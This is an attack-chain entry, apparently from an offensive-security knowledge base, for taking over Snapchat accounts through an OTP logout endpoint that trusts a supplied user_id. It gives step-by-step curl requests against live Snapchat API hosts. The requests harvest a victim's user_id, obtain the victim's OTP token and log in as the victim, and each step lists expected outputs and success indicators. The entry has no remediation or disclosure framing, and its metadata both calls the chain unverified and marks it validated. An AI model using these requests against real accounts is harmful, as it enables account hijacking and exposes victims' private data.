---
id: ac-snapchat-otp-takeover-001
name: Snapchat Account Takeover via Improper OTP Logout Authentication
type: attack_chain
description: >-
  Multi-stage attack exploiting improper authentication in Snapchat's OTP logout
  endpoint to obtain a victim's OTP token and achieve full account takeover.
verified: false
submitted: true
step_count: 4
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.365Z'
procedures:
  - '[[procedures/Establish-Attacker-Session]]'
  - '[[procedures/Obtain-Victim-User-ID]]'
  - '[[procedures/Exploit-Logout-Endpoint-for-OTP]]'
  - '[[procedures/Login-as-Victim-with-OTP]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
tactics:
  - '[[Initial Access]]'
tags:
  - authentication-bypass
  - account-takeover
  - otp
  - api-exploit
  - snapchat
platforms:
  - Web
  - Mobile (Android)
tools:
  - '[[tools/Burp-Suite]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---

# Snapchat Account Takeover via Improper OTP Logout Authentication

Multi-stage attack chain demonstrating a complete account takeover workflow by exploiting an improper authentication flaw in Snapchat's One Tap Password (OTP) login/logout flow. The /scauth/otp/droid/logout endpoint trusts the user_id parameter without session validation, allowing an attacker to obtain an OTP token for any victim whose user_id is known, which is easily exposed in API responses like friend requests. This enables full access to the victim's account via the /scauth/otp/login endpoint.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Establish Attacker Session] --> B[Obtain Victim User ID]
    B --> C[Exploit Logout for OTP Token]
    C --> D[Login as Victim]
    D --> E[Account Takeover Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Platform: Snapchat Mobile App (Android) or Web API
- Services: Snapchat API on Google Cloud Platform (GCP)
- Tech Stack: RESTful API endpoints (/scauth/otp/...)
- Required Access: Attacker's own Snapchat account credentials; victim's username and user_id (obtainable from public or friended API responses)

### Initial Access Requirements

- Valid attacker Snapchat account
- Network access to api.snapchat.com (no special privileges needed)
- Tools for intercepting/modifying HTTP requests (e.g., Burp Suite proxy)
- Victim's user_id: Easily obtained if friended or from exposed API data

## Detailed Attack Procedures

### Step 1: Establish Attacker Session

procedure: [[procedures/Establish-Attacker-Session]]

**Objective**: Log in to the attacker's own Snapchat account to establish a valid session with necessary authentication headers.

**Instructions**: Use Burp Suite to intercept and perform a standard login request to the Snapchat API, capturing session tokens like X-Snapchat-Client-Auth.

**Expected Output**: Successful login response with session headers and cookies.

**Success Indicators**:
- Valid X-Snapchat-Client-Auth header obtained
- Attacker session active (no 401 errors in subsequent requests)

### Step 2: Obtain Victim User ID

procedure: [[procedures/Obtain-Victim-User-ID]]

**Objective**: Retrieve the victim's user_id from exposed API responses, such as friend request endpoints.

**Instructions**: With the attacker session active, send a GET request to friend-related endpoints (e.g., /friends/get) using [[commands/curl-friend-request]] or Burp Suite to inspect responses for user_id.

```bash
curl -X GET 'https://gcp.api.snapchat.com/friends/get' -H 'X-Snapchat-Client-Auth: [attacker_token]'
```

**Expected Output**: JSON response containing {"user_id": "victim_user_id", ...} for the target victim.

**Success Indicators**:
- Victim's user_id extracted (numeric string, e.g., "123456789")
- No authentication errors

### Step 3: Exploit Logout Endpoint for OTP Token

procedure: [[procedures/Exploit-Logout-Endpoint-for-OTP]]

**Objective**: Send a logout request to /scauth/otp/droid/logout using the victim's user_id in the attacker's session to trick the server into generating and returning an OTP token for the victim.

**Instructions**: Intercept the request in Burp Suite and modify the JSON body to replace user_id with the victim's. Execute using [[commands/snapchat-logout-otp-exploit]]:

```bash
curl -X POST 'https://gcp.api.snapchat.com/scauth/otp/droid/logout' -H 'Content-Type: application/json; charset=utf-8' -H 'X-Snapchat-Client-Auth: [attacker_token]' -H 'X-Snapchat-UUID: [uuid]' -H 'x-snapchat-userid: [attacker_id]' -H 'username: [attacker_username]' -H 'req_token: [token]' -H 'timestamp: [current_ms]' -H 'Accept: application/json' -H 'User-Agent: Snapchat/10.78.1.0 [device]' -H 'Accept-Language: en-GB;q=1, en;q=0.9' -H 'Accept-Encoding: gzip, deflate' --data-raw '{"user_id":"[victim_user_id]","device_id":"[device_id]","device_name":"[device_name]"}'
```

**Expected Output**: {"status":"SUCCESS","user_id":"[victim_user_id]","token":"[otp_token]","expiry_hint":[number]}

**Success Indicators**:
- OTP token received (short-lived, use immediately)
- Status: SUCCESS without validation errors

### Step 4: Login as Victim with OTP

procedure: [[procedures/Login-as-Victim-with-OTP]]

**Objective**: Use the obtained OTP token and victim's username to authenticate and take over the account via the login endpoint.

**Instructions**: Prepare a form-encoded POST to /scauth/otp/login with the OTP token. Execute using [[commands/snapchat-otp-login-exploit]]:

```bash
curl -X POST 'https://gcp.api.snapchat.com/scauth/otp/login' -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' -H 'X-Snapchat-Client-Auth: [attacker_token]' -H 'X-Snapchat-UUID: [uuid]' -H 'User-Agent: Snapchat/10.78.1.0 [device]' -H 'Accept: application/json' -H 'Accept-Language: en-GB;q=1, en;q=0.9' -H 'Accept-Encoding: gzip, deflate' --data 'application_id=com.snap.framework&attestation=[attestation]&device_id=[device_id]&dsig=[dsig]&dtoken1i=[dtoken]&fidelius_client_init=[fidelius]&height=1920&max_video_height=1920&max_video_width=1080&password=[redacted]&reactivation_confirmed=false&req_token=[req_token]&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=[current_ms]&token=[otp_token]&username=[victim_username]&width=1080'
```

**Expected Output**: {"updates_response":{"logged":true,"username":"[victim_username]","user_id":"[victim_user_id]",...}}

**Success Indicators**:
- Logged: true in response
- Victim's account details returned, confirming takeover

## Attack Chain Summary

### Key Achievements

1. Bypassed authentication validation to obtain OTP for arbitrary user
2. Achieved full account access without victim's credentials or device
3. Demonstrated high-impact takeover affecting any Snapchat user with known user_id

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[External Remote Services]] External Remote Services

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access

---
*Last updated: 2024-10-01T00:00:00Z*
